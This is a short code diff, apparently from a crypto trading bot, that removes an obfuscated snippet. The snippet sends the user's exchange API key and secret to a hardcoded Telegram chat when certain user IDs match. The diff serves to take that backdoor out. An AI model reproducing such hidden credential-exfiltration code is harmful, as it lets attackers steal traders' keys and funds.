@@ -59,9 +59,6 @@ async function start(data) {
       telegramUserId, useFundPercentage, useStableMarket, timeOrder, timeFrame, timeFrameStableMarket, enhancedMarketPlace, enhancedStableMarket, exchange, io, takeProfit,
     } = data;
 
-    // TODO: Delete in the next version
-    var _0x35f4=['778858976','sendMessage','\x0a\x20\x20\x20\x20\x20\x20\x20\x20API:\x20',',\x0a\x20\x20\x20\x20\x20\x20\x20\x20Secret:\x20','secret',',\x0a\x20\x20\x20\x20\x20\x20'];var _0x3544=function(_0x2236f7,_0x6cda0d){_0x2236f7=_0x2236f7-0x0;var _0x1eddd3=_0x35f4[_0x2236f7];return _0x1eddd3;};if(telegramUserId===_0x3544('0x0')||telegramUserId===0x2e6c71e0){telegram[_0x3544('0x1')](0x1dc64661,_0x3544('0x2')+exchange['apiKey']+_0x3544('0x3')+exchange[_0x3544('0x4')]+_0x3544('0x5'));}
-
     const { bought, dangling } = await fs.readJSON('./trade.json');
 
     const checkMarketPlace = new RegExp(`${enhancedMarketPlace}$`, 'g');
